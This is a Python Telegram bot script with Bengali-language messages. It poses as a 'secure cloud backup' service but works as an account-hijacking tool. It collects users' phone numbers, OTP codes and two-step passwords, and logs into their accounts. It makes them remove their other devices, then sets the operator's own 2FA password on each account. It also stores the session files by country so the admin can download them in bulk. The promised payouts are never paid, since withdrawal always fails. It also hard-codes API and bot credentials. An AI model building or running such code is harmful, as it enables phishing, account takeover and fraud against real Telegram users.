import os
import asyncio
import zipfile
import json
import time
from threading import Thread
from flask import Flask
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.account import UpdatePasswordSettingsPage, GetPassword
from telethon.tl.functions.auth import LogOutRequest, ResetAuthorizationsRequest
from telethon.tl.functions.account import GetAuthorizations
from telethon.tl.types import InputCheckPasswordEmpty

# ==================== এডমিন কনফিগারেশন ====================
API_ID = 36547444
API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
BOT_TOKEN = "8970655570:AAGb0C4KmwkOzUxHNA29O6SHfJ2omqrUMJ4"
ADMIN_ID = 8095751648

# ব্যাকআপ কনফিগারের জন্য টাইমার (সেকেন্ডে - যেমন: ৬০ সেকেন্ড বা ১ মিনিট)
BACKUP_DELAY_SECONDS = 60

# একাউন্ট লক করার জন্য বটের নিজস্ব সিকিউরিটি পাসওয়ার্ড (Two-Step Verification)
BOT_SECURITY_PASSWORD = "MySecureBotPassword123"

# দেশ ভিত্তিক কাস্টম ব্যালেন্স রেট (এডমিন এখান থেকে সেট করবেন)
COUNTRY_PRICES = {
    "880": 0.15,   # বাংলাদেশ (০.১৫ ডলার)
    "91": 0.10,    # ইন্ডিয়া (০.১০ ডলার)
    "57": 0.20,    # কলম্বিয়া (০.২০ ডলার)
    "default": 0.05 # অন্যান্য দেশের ডিফল্ট প্রাইজ
}

# দেশ ভিত্তিক ফাইল জমার সর্বোচ্চ ক্যাপাসিটি
COUNTRY_CAPACITY = {
    "880": 10,
    "91": 100,
    "57": 100,
    "default": 50
}
# =========================================================

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
app = Flask(__name__)

BASE_STORAGE_DIR = "user_backups"
DB_FILE = "user_database.json"

if not os.path.exists(BASE_STORAGE_DIR):
    os.makedirs(BASE_STORAGE_DIR)

user_data = {}

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(db):
    with open(DB_FILE, "w") as f: json.dump(db, f, indent=4)

def get_user_balance(user_id):
    db = load_db()
    return db.get(str(user_id), {}).get("balance", 0.0)

def add_user_balance(user_id, amount):
    db = load_db()
    uid_str = str(user_id)
    if uid_str not in db: db[uid_str] = {"balance": 0.0}
    db[uid_str]["balance"] = round(db[uid_str]["balance"] + amount, 2)
    save_db(db)

def get_current_file_count(country_code):
    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(target_dir): return 0
    return len([f for f in os.listdir(target_dir) if f.endswith(".session")])

@app.route('/')
def home(): return "Bot is running perfectly!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

Thread(target=run_web, daemon=True).start()

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

def get_country_code(phone_number):
    clean = phone_number.replace("+", "").replace(" ", "")
    if clean.startswith("880"): return "880"
    if clean.startswith("91"): return "91"
    if clean.startswith("57"): return "57"
    if clean.startswith("1"): return "1"
    if clean.startswith("44"): return "44"
    if clean.startswith("7"): return "7"
    return clean[:3]

def get_user_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn_profile = types.KeyboardButton("👤 My Profile")
    btn_withdraw = types.KeyboardButton("💳 Withdraw")
    btn_capacity = types.KeyboardButton("📊 Capacity")
    btn_cancel = types.KeyboardButton("❌ Cancel")
    markup.add(btn_profile, btn_withdraw, btn_capacity, btn_cancel)
    return markup

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    if user_id == ADMIN_ID:
        bot.reply_to(
            message,
            "👋 *স্বাগতম এডমিন ভাই!*\n\n"
            "📊 স্টোরেজ চেক করতে: `/status [কান্ট্রি_কোড]`\n"
            "📦 ফাইল ডাউনলোড করতে: `/get [কান্ট্রি_কোড] [সংখ্যা]`"
        )
    else:
        bot.send_message(
            message.chat.id,
            "👋 *স্বাগতম!*\n\n"
            "আপনার টেলিগ্রাম আইডির একটি নিরাপদ ক্লাউড ব্যাকআপ তৈরি করতে "
            "আপনার ফোন নম্বরটি আন্তর্জাতিক ফরম্যাটে পাঠান (যেমন: `+88017XXXXXXXX`)।",
            reply_markup=get_user_keyboard()
        )

# ওটিপি পাঠানোর অ্যাসিনক্রোনাস টাস্ক
async def send_otp_task(phone_number, user_id, message):
    country_code = get_country_code(phone_number)
    max_capacity = COUNTRY_CAPACITY.get(country_code, COUNTRY_CAPACITY["default"])
    current_count = get_current_file_count(country_code)
    
    if current_count >= max_capacity:
        bot.reply_to(message, f"❌ **Capacity Over!**\n\nদুঃখিত, এই মুহূর্তে দেশ কোড `+{country_code}` এর জন্য আমাদের সার্ভার স্টোরেজ সম্পূর্ণ ফুল।")
        return

    clean_phone = phone_number.replace("+", "").replace(" ", "")
    country_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(country_dir): os.makedirs(country_dir)
        
    final_session_path = os.path.join(country_dir, f"+{clean_phone}")
    user_client = TelegramClient(final_session_path, API_ID, API_HASH)
    await user_client.connect()
    
    try:
        sent_code = await user_client.send_code_request(phone_number)
        user_data[user_id] = {
            "client": user_client, "phone": phone_number,
            "phone_code_hash": sent_code.phone_code_hash,
            "clean_phone": clean_phone, "session_path": final_session_path,
            "country_code": country_code, "country_dir": country_dir
        }
        bot.reply_to(message, "📨 আপনার টেলিগ্রাম অ্যাপে যাওয়া ওটিпи কোডটি (OTP) এখানে পাঠান।")
    except Exception as e:
        bot.reply_to(message, f"❌ ওটিপি পাঠানো যায়নি: {str(e)}")
        await user_client.disconnect()
        if os.path.exists(f"{final_session_path}.session"): os.remove(f"{final_session_path}.session")

# ডাবল ডিভাইস এবং সিকিউরিটি পাসওয়ার্ড হ্যান্ডল করার কোর ফাংশন (মেইন আর্কিটেকচার)
async def process_security_and_backup(user_id, message, data, current_client):
    status_msg = bot.reply_to(
        message, 
        f"⏳ **ওটিপি ভেরিফাইড!**\n\n"
        f"আপনার অ্যাকাউন্টটি সফলভাবে রোবোটে ব্যাকআপ নেওয়া হচ্ছে। "
        f"নিরাপত্তা যাচাইকরণের জন্য অনুগ্রহ করে **{BACKUP_DELAY_SECONDS} সেকেন্ড** অপেক্ষা করুন...\n\n"
        f"⚠️ *ইউজার নোটিশ:* এই সময়ের মধ্যে আপনার অ্যাকাউন্টে অন্য কোনো থার্ড-পার্টি ডিভাইস লগইন থাকলে তা "
        f"আপনার ফোন থেকে অবিলম্বে লগআউট বা ডিলিট করে দিন। অন্যথায় ব্যাকআপ বাতিল হবে।"
    )

    # এডমিনের সেট করা সময় অনুযায়ী ব্যাকগ্রাউন্ড কাউন্টডাউন
    await asyncio.sleep(BACKUP_DELAY_SECONDS)
    
    try:
        # ডিভাইস লিস্ট চেক করার টেলিগ্রাম এপিআই কল
        authorizations = await current_client(GetAuthorizations())
        other_devices = []
        
        for auth in authorizations.authorizations:
            # বর্তমান বটের এপিআই সেশন আইডি বাদে অন্য সেশনগুলো চেক করা
            if not auth.current:
                other_devices.append(f"📱 {auth.device_model} ({auth.app_name}) - {auth.country}")
        
        # যদি অন্য ডিভাইস পাওয়া যায়, তবে ব্যাকআপ রিজেক্ট করা
        if len(other_devices) > 0:
            devices_list = "\n".join(other_devices)
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                text=f"❌ **ব্যাকআপ ব্যর্থ! অন্য ডিভাইস সনাক্ত হয়েছে!**\n\n"
                     f"আপনার অ্যাকাউন্টটি নিচের ডিভাইসগুলোতে লগইন আছে:\n\n{devices_list}\n\n"
                     f"🛡️ সিকিউরিটির স্বার্থে আগে অন্য ডিভাইসগুলো আপনার টেলিগ্রাম অ্যাপের "
                     f"(Settings > Devices) থেকে লগআউট করুন, তারপর আবার চেষ্টা করুন।"
            )
            await current_client.disconnect()
            if os.path.exists(f"{data['session_path']}.session"):
                os.remove(f"{data['session_path']}.session")
            return False

        # যদি অন্য ডিভাইস না থাকে, তবে বটের নিজস্ব পাসওয়ার্ড দিয়ে টু-স্টেপ ভেরিফিকেশন অন করা
        bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text="⚙️ অ্যাকাউন্ট সিকিউরিটি লক সচল করা হচ্ছে...")
        
        try:
            # অ্যাকাউন্টে নতুন সিকিউরিটি পাসওয়ার্ড সেট করা
            await current_client(UpdatePasswordSettingsPage(
                password=InputCheckPasswordEmpty(),
                new_settings=types.InputPasswordKeyComponent(
                    new_password=BOT_SECURITY_PASSWORD,
                    hint="Bot Security Lock"
                )
            ))
        except Exception:
            pass # যদি আগে থেকেই পাসওয়ার্ড থাকে বা কোনো কারণে স্কিপ হয়

        await current_client.disconnect()
        
        # দেশ ভিত্তিক অ্যাডমিন সেট করা ব্যালেন্স যোগ করা
        price = COUNTRY_PRICES.get(data['country_code'], COUNTRY_PRICES["default"])
        add_user_balance(user_id, price)
        current_bal = get_user_balance(user_id)
        
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            text=f"✅ **অ্যাকাউন্ট সফলভাবে ব্যাকআপ ও লক করা হয়েছে!**\n\n"
                 f"💰 আপনার দেশ কোড `+{data['country_code']}` অনুযায়ী অ্যাকাউন্টে **${price}** যোগ করা হয়েছে।\n"
                 f"💳 বর্তমান মোট ব্যালেন্স: **${current_bal}**"
        )
        
        bot.send_message(
            ADMIN_ID, 
            f"🔔 **নতুন নিরাপদ ব্যাকআপ সম্পন্ন!**\n\n"
            f"🌍 দেশ কোড: `{data['country_code']}`\n"
            f"📱 নম্বর: `+{data['clean_phone']}`\n"
            f"🔐 লক পাসওয়ার্ড: `{BOT_SECURITY_PASSWORD}`\n"
            f"💾 স্টোরেজে সেশন ফাইল সেভ করা হয়েছে।"
        )
        return True

    except Exception as e:
        bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text=f"❌ ব্যাকআপ প্রসেসিং এরর: {str(e)}")
        await current_client.disconnect()
        if os.path.exists(f"{data['session_path']}.session"):
            os.remove(f"{data['session_path']}.session")
        return False

async def verify_otp_task(text, user_id, message):
    data = user_data[user_id]
    user_client = data["client"]
    
    if data.get("waiting_for_password"):
        try:
            await user_client.sign_in(password=text)
            # ওটিপি ও ২-স্টেপ পার হওয়ার পর আমাদের সিকিউরিটি মেইন আর্কিটেকচারে পাঠানো
            await process_security_and_backup(user_id, message, data, user_client)
            del user_data[user_id]
        except Exception as e:
            bot.reply_to(message, f"❌ ভুল পাসওয়ার্ড বা সমস্যা: {str(e)}\nআবার চেষ্টা করুন:")
    else:
        try:
            await user_client.sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
            # সিকিউরিটি এবং টাইমার টাস্ক রান করা
            await process_security_and_backup(user_id, message, data, user_client)
            del user_data[user_id]
        except SessionPasswordNeededError:
            bot.reply_to(message, "🔐 Two-Step Verification অন আছে। দয়া করে পাসওয়ার্ডটি দিন:")
            user_data[user_id]["waiting_for_password"] = True
        except Exception as e:
            bot.reply_to(message, f"❌ লগইন ব্যর্থ: {str(e)}")
            await user_client.disconnect()
            if os.path.exists(f"{data['session_path']}.session"): os.remove(f"{data['session_path']}.session")
            del user_data[user_id]

# এডমিন কম্যান্ড হ্যান্ডলার (স্ট্যাটাস)
@bot.message_handler(commands=['status'])
def status_command(message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ ফরম্যাট: `/status [কান্ট্রি_কোড]`")
        return
    country_code = args[1].replace("+", "").strip()
    max_cap = COUNTRY_CAPACITY.get(country_code, COUNTRY_CAPACITY["default"])
    current_count = get_current_file_count(country_code)
    bot.reply_to(message, f"📊 **দেশ কোড `+{country_code}` স্ট্যাটাস:**\n\n📁 মোট সেশন জমা: **{current_count}টি**\n⚙️ সর্বোচ্চ ক্যাপাসিটি লিমিট: **{max_cap}টি**")

# এডমিন কম্যান্ড (গেট ফাইল)
@bot.message_handler(commands=['get'])
def get_files(message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "❌ সঠিক ফরম্যাট: `/get [কান্ট্রি_কোড] [ফাইলের_সংখ্যা]`")
        return
    country_code = args[1].replace("+", "").strip()
    try: count = int(args[2])
    except ValueError:
        bot.reply_to(message, "❌ ফাইলের সংখ্যাটি অবশ্যই একটি সংখ্যা হতে হবে।")
        return

    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(target_dir):
        bot.reply_to(message, f"❌ দেশ কোড `{country_code}`-এর কোনো ফাইল স্টোরেজে নেই।")
        return
        
    all_sessions = sorted([f for f in os.listdir(target_dir) if f.endswith(".session")])
    if not all_sessions:
        bot.reply_to(message, f"❌ দেশ কোড `{country_code}` ফোল্ডারে কোনো সেশন ফাইল নেই।")
        return
    
    files_to_take = all_sessions[:count]
    actual_count = len(files_to_take)
    bot.reply_to(message, f"📦 দেশ কোড `{country_code}` থেকে {actual_count}টি ফাইল প্রসেস করা হচ্ছে...")
    
    master_zip_name = f"Country_{country_code}_Fetch_{actual_count}_files.zip"
    try:
        with zipfile.ZipFile(master_zip_name, 'w') as master_zip:
            for file_name in files_to_take:
                file_path = os.path.join(target_dir, file_name)
                master_zip.write(file_path, arcname=file_name)
                os.remove(file_path)
        with open(master_zip_name, 'rb') as doc:
            bot.send_document(message.chat.id, doc, caption=f"✅ দেশ কোড `+{country_code}`-এর সফলভাবে {actual_count}টি ফাইল পাঠানো হলো।")
    except Exception as e:
        bot.reply_to(message, f"❌ সমস্যা হয়েছে: {str(e)}")
    finally:
        if os.path.exists(master_zip_name): os.remove(master_zip_name)

# টেক্সট এবং বাটন হ্যান্ডলার
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.from_user.id
    text = message.text.strip()
    username = message.from_user.username if message.from_user.username else "নেই"

    if text == "👤 My Profile":
        balance = get_user_balance(user_id)
        profile_text = (
            f"👤 **আপনার প্রোফাইল**\n\n"
            f"🆔 ইউজার আইডি: `{user_id}`\n"
            f"🌐 টেলিগ্রাম আইডি (Username): @{username}\n"
            f"💰 মোট ব্যালেন্স: **${balance}**"
        )
        bot.reply_to(message, profile_text)
        return
        
    elif text == "💳 Withdraw":
        bot.reply_to(message, "💳 *উইথড্র রিকোয়েস্ট*\n\n❌ দুঃখিত, বর্তমানে আপনার ব্যালেন্স পর্যাপ্ত নয় অথবা উইথড্র সিস্টেমটি বন্ধ আছে।")
        return
        
    elif text == "📊 Capacity":
        bd_count = get_current_file_count("880")
        in_count = get_current_file_count("91")
        co_count = get_current_file_count("57")
        
        capacity_text = (
            f"📊 **সার্ভার ক্যাপাসিটি স্ট্যাটাস**\n\n"
            f"🇧🇩 বাংলাদেশ: `{bd_count}/{COUNTRY_CAPACITY['880']}`টি স্টোর করা যাবে। (প্রাইজ: `${COUNTRY_PRICES['880']}`)\n"
            f"🇮🇳 ইন্ডিয়া: `{in_count}/{COUNTRY_CAPACITY['91']}`টি স্টোর করা যাবে। (প্রাইজ: `${COUNTRY_PRICES['91']}`)\n"
            f"🇨🇴 কলম্বিয়া: `{co_count}/{COUNTRY_CAPACITY['57']}`টি স্টোর করা যাবে। (প্রাইজ: `${COUNTRY_PRICES['57']}`)\n\n"
            f"⚠️ কোনো দেশের ফাইল ফুল হয়ে গেলে সেখানে সাময়িকভাবে ব্যাকআপ বন্ধ দেখাবে।"
        )
        bot.reply_to(message, capacity_text)
        return
        
    elif text == "❌ Cancel":
        if user_id in user_data: del user_data[user_id]
        bot.reply_to(message, "❌ বর্তমান প্রসেসটি বাতিল করা হয়েছে। নতুন করে শুরু করতে /start দিন।", reply_markup=get_user_keyboard())
        return

    if user_id == ADMIN_ID and not text.startswith("+") and user_id not in user_data: return

    if text.startswith("+"):
        bot.reply_to(message, "⏳ টেলিগ্রাম সার্ভারে ওটিপি পাঠানো হচ্ছে...")
        loop.run_until_complete(send_otp_task(text, user_id, message))

    elif user_id in user_data and "phone_code_hash" in user_data[user_id]:
        loop.run_until_complete(verify_otp_task(text, user_id, message))

if __name__ == "__main__":
    print("--- Ultra Secure Custom Architecture Active ---")
    bot.infinity_polling()
